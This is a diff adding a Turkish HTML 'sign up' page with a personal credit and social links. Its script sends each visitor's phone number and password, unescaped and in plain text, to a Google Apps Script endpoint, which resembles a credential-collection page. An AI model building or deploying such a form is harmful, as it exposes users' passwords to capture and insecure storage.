@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Kayıt Sayfası</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
+      background: #f2f2f2;
+    }
+    form {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      display: inline-block;
+    }
+    input {
+      margin: 10px;
+      padding: 10px;
+      width: 250px;
+    }
+    .info {
+      margin-top: 20px;
+    }
+    img {
+      width: 100px;
+      border-radius: 50%;
+      margin-top: 20px;
+    }
+    .links a {
+      display: block;
+      margin-top: 10px;
+      text-decoration: none;
+      color: blue;
+    }
+  </style>
+</head>
+<body>
+  <h2>Kayıt Ol</h2>
+  <form id="signup-form">
+    <input type="tel" name="phone" placeholder="Telefon Numaranız" required><br>
+    <input type="password" name="password" placeholder="Şifreniz" required><br>
+    <button type="submit">Gönder</button>
+  </form>
+
+  <div class="info">
+    <p>Bu sayfa <strong>basem halaika</strong> tarafından oluşturulmuştur.</p>
+    <img src="me.png" alt="Basem Halaika'nın fotoğrafı"><br>
+    <p>İnternet çalışmıyorsa, aşağıdaki bağlantılardan benimle iletişime geçin:</p>
+    <div class="links">
+      <a href="https://www.tiktok.com/@aaddbr1241242?_t=ZS-8wSnkn0RTEn&_r=1" target="_blank">TikTok Profilim</a>
+      <a href="https://www.facebook.com/share/16PgW3xNgG/?mibextid=wwXIfr" target="_blank">Facebook Profilim</a>
+      <a href="https://lolohole.github.io/appstore/" target="_blank">Kişisel Web Sitem</a>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('signup-form');
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      const phone = form.phone.value;
+      const password = form.password.value;
+
+      fetch("https://script.google.com/macros/s/AKfycbwdYhq7jQBvvKgTT6zQu5B6VMuFTJHfAl5W-8yyh-qdQ54D8l1UUYbGvUZx6T0bwBmDNg", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: `phone=${phone}&password=${password}`
+      });
+
+      alert("Kaydınız başarıyla gönderildi!");
+      form.reset();
+    });
+  </script>
+</body>
+</html>
